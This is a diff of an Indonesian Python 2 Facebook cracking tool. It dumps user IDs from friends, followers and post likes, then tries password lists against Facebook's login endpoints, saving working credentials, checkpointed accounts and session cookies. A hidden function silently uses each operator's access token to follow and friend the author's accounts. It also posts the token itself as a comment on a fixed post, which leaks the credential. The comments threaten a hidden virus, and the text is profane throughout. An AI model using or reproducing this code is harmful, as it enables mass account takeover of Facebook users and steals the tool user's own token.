@@ -5,24 +5,30 @@
 
 # Jangan di recode bro ada virus yang tersembunyi.
 # jika anda ketahuan merecode ulang, sama saya tidak akan segan" untuk menghidupkan virusnya..
-
 import os
 try:
     import requests
 except ImportError:
     print '\n [×] Modul requests belum terinstall!...\n'
-    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
+    os.system('pip2 install requests')
 
 try:
     import concurrent.futures
 except ImportError:
     print '\n [×] Modul Futures belum terinstall!...\n'
-    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')
+    os.system('pip2 install futures')
 
-import requests, sys, os, bs4, random, time, re, json
+try:
+    from bs4 import BeautifulSoup
+except ImportError:
+    print '\n [×] Modul Bs4 belum terinstall!...\n'
+    os.system('pip2 install bs4')
+
+import requests, sys, bs4, os, random, time, re, json
 from concurrent.futures import ThreadPoolExecutor as YayanGanteng
+from requests.exceptions import ConnectionError
+from bs4 import BeautifulSoup as parser
 from datetime import datetime
-from bs4 import BeautifulSoup
 from time import sleep
 ct = datetime.now()
 n = ct.month
@@ -76,6 +82,7 @@ cp = []
 id = []
 user = []
 loop = 0
+xi_jimpinx = '1714000985456399'
 koh = '100005395413800'
 hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
 # lempankkkkkkkk
@@ -101,7 +108,7 @@ logo = ''' \033[0;96m __  __        __  ______  ____
  \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Yayan-XD
  \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/KM39453'''
 
-
+lo_ngentod = '1714009362122228'
 # crack selesai
 def hasil(ok,cp):
     if len(ok) != 0 or len(cp) != 0:
@@ -116,8 +123,8 @@ def hasil(ok,cp):
 def yayanxd():
     os.system('clear')
     print (' %s*%s tools ini menggunakan login token facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan token facebook?\n %s*%s ketik %sopen%s untuk mendapatkan token facebook.'%(O,N,O,N,O,N,H,N))
-    __cindy__ = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
-    if __cindy__ in ('open', 'Open', 'OPEN'):
+    kontol = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
+    if kontol in ('open', 'Open', 'OPEN'):
         print '\n%s *%s note! usahakan akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
         print '%s *%s jangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
         print '%s *%s setelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
@@ -126,53 +133,42 @@ def yayanxd():
         os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
         yayanxd()
     try:
-        xzxz = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
+        xzxz = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol))
         xdxd = json.loads(xzxz.text)
         nama = xdxd['name']
-        zedd = open('__yayan__.txt', 'w')
-        zedd.write(__cindy__)
-        zedd.close()
+        wuhan(kontol)
         print '\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N);time.sleep(2)
         print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N);time.sleep(2)
+        open('.memek.txt', 'w').write(kontol)
         raw_input(' %s*%s tekan enter '%(O,N))
         os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
-        kontol()
+        moch_yayan()
     except KeyError:
         print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);yayanxd()
 
 
-lo_ngentod = '1714009362122228'
 ### ORANG GANTENG ###
 def moch_yayan():
     os.system('clear')
     try:
-        __cindy__=open('__yayan__.txt','r').read()
-    except (KeyError, IOError):
-        os.system('clear')
-        print '\n %s[%s×%s] token invalid'%(N,M,N)
-        time.sleep(2)
-        os.system('rm -rf __yayan__.txt')
-        yayanxd()
+    	kontol = open('.memek.txt', 'r').read()
+    except (IOError):
+        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
     try:
-        osjaoaosnsi = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
-        jaoanzjwowj = json.loads(osjaoaosnsi.text)
-        nama = jaoanzjwowj['name']
-    except (KeyError, IOError):
-        os.system('clear')
-        print '\n %s[%s×%s] token invalid'%(N,M,N)
-        time.sleep(2)
-        os.system('rm -rf __yayan__.txt')
-        yayanxd()
+        req = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol))
+        get = json.loads(req.text)
+        nama = get['name']
+    except (IOError):
+        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
     except requests.exceptions.ConnectionError:
-        print '\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N)
-        exit()
+        exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
     os.system('clear')
     print logo
-    print '___________________________________________________________'
-    print '\n (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama)
+    print '___________________________________________________________\n'
+    print ' (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama)
     print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
-    print '___________________________________________________________'
-    print '\n [%s1%s]. Dump id dari teman'%(O,N)
+    print '___________________________________________________________\n'
+    print ' [%s1%s]. Dump id dari teman'%(O,N)
     print ' [%s2%s]. Dump id dari teman publik'%(O,N)
     print ' [%s3%s]. Dump id dari total followers'%(O,N)
     print ' [%s4%s]. Dump id dari like postingan'%(O,N)
@@ -180,117 +176,96 @@ def moch_yayan():
     print ' [%s6%s]. Check ingformasi akun fb'%(O,N)
     print ' [%s7%s]. Lihat hasil crack'%(O,N)
     print ' [%s8%s]. Settings user agent'%(O,N)
-    print ' [%s9%s]. Ingfo %sscript'%(O,N,O)
-    print ' %s[%s0%s]. logout (%shapus token%s)'%(N,M,N,M,N)
-    awokawokawokawokawokawokawokawokawokawokawokawok()
-def awokawokawokawokawokawokawokawokawokawokawokawok():
-        yan = raw_input('\n [*] menu : ')
-        if yan == '':
-           print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu tolol!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
-        elif yan =='1':
-                teman()
-        elif yan =='2':
-                publik()
-        elif yan =='3':
-                followers()
-        elif yan =='4':
-                postingan()
-        elif yan =='5':
-                __crack__().plerr()
-        elif yan =='6':
-        	cek_ingfo()
-        elif yan =='7':
-            print("\n \033[0;97m[\033[0;96m1\033[0;97m] Check hasil OK")
-            print(" \033[0;97m[\033[0;96m2\033[0;97m] Check hasil CP")
-            ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
-            if ask =="":
-                moch_yayan()
-            elif ask == "1" or ask == "01":
-                try:
-                    totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
-                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
-                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;92mOK\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \x1b[0mTotal %s: %s%s\033[0;92m\n"%(ha, op, ta,M,H,len(totalok)))
-                    os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
-                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
-                    moch_yayan()
-                except (IOError):
-                    print("\n \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil ok :(")
-                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
-                    moch_yayan()
-            elif ask == "2" or ask == "02":
-                try:
-                    totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
-                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
-                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \x1b[0mTotal %s: %s%s\033[0;93m\n"%(ha, op, ta,M,K,len(totalcp)))
-                    os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
-                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
-                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
-                    moch_yayan()
-                except (IOError):
-                    print("\n \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil cp :(")
-                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
-                    moch_yayan()
-            else:
-                moch_yayan()
-        elif yan =='8':
-        	seting_yntkts()
-        elif yan =='9':
-        	info_tools()
-        elif yan =='0':
-            	print '\n'
-                tod()
-                time.sleep(1)
-                os.system('rm -rf __yayan__.txt')
-                jalan ('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H))
-                time.sleep(2)
-                exit()
+    print ' [%s9%s]. Ingfo %sscript%s'%(O,N,O,N)
+    print ' [%s0%s]. logout (%shapus token%s)'%(M,N,M,N)
+    pepek = raw_input('\n [*] menu : ')
+    if pepek == '':
+        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);moch_yayan()
+    elif pepek in['1','01']:
+        teman(kontol)
+    elif pepek in['2','02']:
+        publik(kontol)
+    elif pepek in['3','03']:
+        followers(kontol)
+    elif pepek in['4','04']:
+        postingan(kontol)
+    elif pepek in['5','05']:
+        __crack__().plerr()
+    elif pepek in['6','06']:
+        cek_ingfo(kontol)
+    elif pepek in['7','07']:
+        print '\n %s[%s1%s] Check hasil OK'%(N,O,N)
+        print ' %s[%s2%s] Check hasil CP'%(N,O,N)
+        memek = raw_input("\n %s[%s?%s] Choose : "%(N,K,N))
+        if memek =='':
+            print '\n %s[%s×%s] jangan kosong bro '%(N,M,N);time.sleep(1);moch_yayan()
+        elif memek in['1','01']:
+            try:
+                totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
+                print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
+                print(" [%s+%s] Hasil %sOK%s pada tanggal %s: %s%s-%s-%s%s total %s: %s%s%s\n"%(H,N,H,N,M,H,ha,op,ta,N,M,H,len(totalok),H))
+                os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
+                print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
+                raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+            except (IOError):
+                print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil ok :("%(N,M,N))
+                raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        elif memek in['2','02']:
+            try:
+                totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
+                print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
+                print(" [%s×%s] Hasil %sCP%s pada tanggal %s: %s%s-%s-%s%s total %s: %s%s%s\n"%(K,N,K,N,M,K,ha,op,ta,N,M,K,len(totalcp),K))
+                os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
+                print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
+                raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+            except (IOError):
+                print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil cp :("%(N,M,N))
+                raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
         else:
-            print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu tolol!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
+            print '\n %s[%s×%s] input yang bener'%(N,M,N);time.sleep(1);moch_yayan()
+    elif pepek in['8','08']:
+        seting_yntkts()
+    elif pepek in['9','09']:
+        info_tools()
+    elif pepek in['0','00']:
+        print '\n'
+        tod()
+        time.sleep(1);os.system('rm -rf .memek.txt')
+        jalan('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H));exit()
+    else:
+        print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()
 
 
 # Yang ganti bot nya gw sumpahin mak lo mati ajg!
-xi_jimpinx = '1714000985456399'
-def kontol():
+def wuhan(kontol):
     try:
-        kentod = open('__yayan__.txt', 'r').read()
-    except IOError:
-    	print '\n %s[%s×%s] token invalid'%(N,M,N);yayanxd()
-    requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
-    requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
-    requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
-    requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
-    requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
-    requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
-    requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
-    requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s'%(kentod))
-    requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
-    requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
-    requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
-    requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
-    moch_yayan()
-
+        kentod = kontol
+        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
+    except:
+    	pass
 
 # dump id dari teman hehe
-def teman():
-    try:
-        __cindy__= open('__yayan__.txt', 'r').read()
-    except IOError:
-        print '\n %s[%s×%s] token invalid'%(N,M,N)
-        os.system('rm -rf __yayan__.txt')
-        time.sleep(0.01)
-        yayanxd()
+def teman(kontol):
     try:
         os.mkdir('dump')
     except:pass
     try:
         mmk = raw_input('\n %s[%s?%s] nama file  : '%(N,O,N))
         asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
-        ihh = requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,__cindy__))
-        id = []
-        z = json.loads(ihh.text)
         cin = ('dump/' + mmk + '.json').replace(' ', '_')
-        ys = open(cin, 'w')
-        for a in z['data']:
+        ys  = open(cin, 'w')
+        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,kontol)).json()["data"]:
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
@@ -314,14 +289,7 @@ def teman():
 
 
 # dump id dari teman publik hehe
-def publik():
-    try:
-        __cindy__= open('__yayan__.txt', 'r').read()
-    except IOError:
-        print '\n %s[%s×%s] token invalid'%(N,M,N)
-        os.system('rm -rf __yayan__.txt')
-        time.sleep(0.01)
-        yayanxd()
+def publik(kontol):
     try:
         os.mkdir('dump')
     except:pass
@@ -329,12 +297,9 @@ def publik():
         csy = raw_input('\n %s[%s?%s] id publik  : '%(N,O,N))
         ahh = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
         ihh = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
-        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,__cindy__))
-        id = []
-        z = json.loads(xxx.text)
-        kntl = ('dump/' + ahh + '.json').replace(' ', '_')
-        ys = open(kntl, 'w')
-        for a in z['data']:
+        knt = ('dump/' + ahh + '.json').replace(' ', '_')
+        ys  = open(knt, 'w')
+        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,kontol)).json()["data"]:
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
@@ -344,24 +309,17 @@ def publik():
 
         ys.close()
         jalan('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
-        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,kntl,N)
+        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,knt,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
-        os.remove(kntl)
+        os.remove(knt)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
 
 
 # dump id dari followers hehe
-def followers():
-    try:
-        __cindy__= open('__yayan__.txt', 'r').read()
-    except IOError:
-        print '\n %s[%s×%s] token invalid'%(N,M,N)
-        os.system('rm -rf __yayan__.txt')
-        time.sleep(0.01)
-        yayanxd()
+def followers(kontol):
     try:
         os.mkdir('dump')
     except:pass
@@ -369,12 +327,9 @@ def followers():
         csy = raw_input('\n %s[%s?%s] id follow  : '%(N,O,N))
         mmk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
         asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
-        pok = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,__cindy__))
-        id = []
-        x = json.loads(pok.text)
-        ah = ('dump/' + mmk + '.json').replace(' ', '_')
-        ys = open(ah, 'w')
-        for a in x['data']:
+        ah  = ('dump/' + mmk + '.json').replace(' ', '_')
+        ys  = open(ah, 'w')
+        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
@@ -394,14 +349,7 @@ def followers():
 
 
 # dump id dari postingan hehe
-def postingan():
-    try:
-        __cindy__= open('__yayan__.txt', 'r').read()
-    except IOError:
-        print '\n %s[%s×%s] token invalid'%(N,M,N)
-        os.system('rm -rf __yayan__.txt')
-        time.sleep(0.01)
-        yayanxd()
+def postingan(kontol):
     try:
         os.mkdir('dump')
     except:pass
@@ -409,12 +357,9 @@ def postingan():
         csy = raw_input('\n %s[%s?%s] id posting : '%(N,O,N))
         ppk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
         asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
-        kon = requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,__cindy__))
-        id = []
-        x = json.loads(kon.text)
-        ikeh = ('dump/' + ppk + '.json').replace(' ', '_')
-        ys = open(ikeh, 'w')
-        for a in x['data']:
+        ahh = ('dump/' + ppk + '.json').replace(' ', '_')
+        ys  = open(ahh, 'w')
+        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
@@ -424,33 +369,26 @@ def postingan():
 
         ys.close()
         jalan('\n\n %s[%s✓%s] berhasil dump id dari like postingan'%(N,H,N))
-        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ikeh,N)
+        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ahh,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
-        os.remove(ikeh)
+        os.remove(ahh)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
 
 
 # cek ingfo
-def cek_ingfo():
+def cek_ingfo(kontol):
     try:
-        kontol = open('__yayan__.txt', 'r').read()
-    except (KeyError, IOError):
-        print '\n %s[%s!%s] token/cookies invalid'%(P,M,P)
-        os.system('rm -rf __yayan__.txt')
-        time.sleep(0.01)
-        yayanxd()
-    try:
-        ppk = raw_input("\n [+] masukan id atau username : ")
+        user = raw_input("\n [+] masukan id atau username : ")
         url  = ("https://lookup-id.com/")
-        if "facebook" in ppk:
-            payload = {"fburl": ppk, "check": "Lookup"}
+        if "facebook" in user:
+            payload = {"fburl": user, "check": "Lookup"}
         else:
-            payload = {"fburl": "https://free.facebook.com/" + ppk, "check": "Lookup"}
+            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
         halaman = requests.post(url, data = payload).text.encode("utf-8")
-        sop_ = BeautifulSoup(halaman, "html.parser")
+        sop_ = parser(halaman, "html.parser")
         email_ = sop_.find("span", id = "code")
         ppk = email_.text
         aww = requests.get('https://graph.facebook.com/%s?access_token=%s'%(ppk, kontol))
@@ -618,15 +556,13 @@ def yo_ndak_tau_ko_tanya_saia():
     os.system('rm -rf YNTKTS.txt')
     print '\n %s(%s•%s) notice me: cari User Agent di google chrome.'%(N,O,N)
     print ' (%s×%s) ketik User Agent atau My User Agent....\n'%(M,N)
-    ua = raw_input(' [%s?%s] Masukan User Agent :%s '%(O,N,H))
-    if ua == '':
-        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);time.sleep(2);yo_ndak_tau_ko_tanya_saia()
+    anjng = raw_input(' [%s?%s] Masukan User Agent :%s '%(O,N,H))
+    if anjng == '':
+        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
     try:
-        uas = open('YNTKTS.txt','w')
-        uas.write(ua)
-        uas.close()
-        time.sleep(2)
-        jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N));time.sleep(2);moch_yayan()
+        open('YNTKTS.txt', 'w').write(anjng);time.sleep(2)
+        jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
+        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
     except:pass
 
 
@@ -646,7 +582,6 @@ class __crack__:
 
     def __init__(self):
         self.id = []
-
 
     def plerr(self):
         try:
@@ -728,11 +663,11 @@ class __crack__:
         return
 
 
-    def __api__(self, user, _yan_):
+    def __api__(self, user, __yan__):
         global ok,cp,loop
         sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
-        for pw in _yan_:
+        for pw in __yan__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
@@ -759,8 +694,8 @@ class __crack__:
                 continue
             elif 'www.facebook.com' in response.json()['error_msg']:
                 try:
-                    __cindy__ = open('__yayan__.txt').read()
-                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
+                    kontol = open('.memek.txt').read()
+                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol))
                     az = json.loads(ak.text)
                     graph = az["birthday"]
                     month, day, year = graph.split("/")
@@ -787,11 +722,11 @@ class __crack__:
         loop += 1
 
 
-    def __mbasic__(self, user, _yan_):
+    def __mbasic__(self, user, __yan__):
         global ok,cp,loop
         sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
-        for pw in _yan_:
+        for pw in __yan__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
@@ -799,86 +734,76 @@ class __crack__:
             	_kontol = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
             	_kontol = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
-            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)),
-               'x-fb-net-hni': str(random.randint(20000, 40000)),
-               'x-fb-connection-quality': 'EXCELLENT',
-               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-               'user-agent': _kontol,
-               'content-type': 'application/x-www-form-urlencoded',
-               'x-fb-http-engine': 'Liger'}
-            rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers=headers_)
-            xo = rex.content
-            if 'mbasic_logout_button' in xo or 'save-device' in xo:
-                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
-                wrt = ' [✓] %s|%s' % (user,pw)
-                ok.append(wrt)
-                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
-                break
-                continue
-            if 'checkpoint' in xo:
-                try:
-                    __cindy__ = open('__yayan__.txt').read()
-                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
-                    az = json.loads(ak.text)
-                    graph = az["birthday"]
-                    month, day, year = graph.split("/")
-                    month = bulan[month]
-                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
-                    cp.append(wrt)
-                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
-                    break
-                except (KeyError, IOError):
-                    month = ''
-                    day = ''
-                    year = ''
-                except:
-                    pass
-
-                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
-                wrt = ' [×] %s|%s' % (user,pw)
-                cp.append(wrt)
-                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
-                break
-                continue
-
-        loop += 1
-
-
-    def __mfb__(self, user, _yan_):
-        global ok,cp,loop
-        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
-        sys.stdout.flush()
-        for pw in _yan_:
-            pw = pw.lower()
-            try: os.mkdir('results')
-            except: pass
-            try:
-            	_kontol = open('YNTKTS.txt', 'r').read()
-            except (KeyError, IOError):
-            	_kontol = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
-            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)),
-               'x-fb-net-hni': str(random.randint(20000, 40000)),
-               'x-fb-connection-quality': 'EXCELLENT',
-               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-               'user-agent': _kontol,
-               'content-type': 'application/x-www-form-urlencoded',
-               'x-fb-http-engine': 'Liger'}
             ses = requests.Session()
-            ses.get('https://m.facebook.com/')
-            ses.headers=headers_
-            b = ses.post('https://m.facebook.com/login', data={'email': user, 'pass': pw}).url
-            if 'c_user' in ses.cookies.get_dict().keys():
-                print '\r  %s* --> %s|%s|%s%s' % (H,user,pw,kuki,N)
-                wrt = ' [✓] %s|%s' % (user,pw)
+            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+            p = ses.get("https://mbasic.facebook.com")
+            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
+            if "c_user" in ses.cookies.get_dict().keys():
+            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
+                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
                 continue
-            elif 'checkpoint' in ses.cookies.get_dict().keys():
+            elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
-                    __cindy__ = open('__yayan__.txt').read()
-                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
+                    kontol = open('.memek.txt').read()
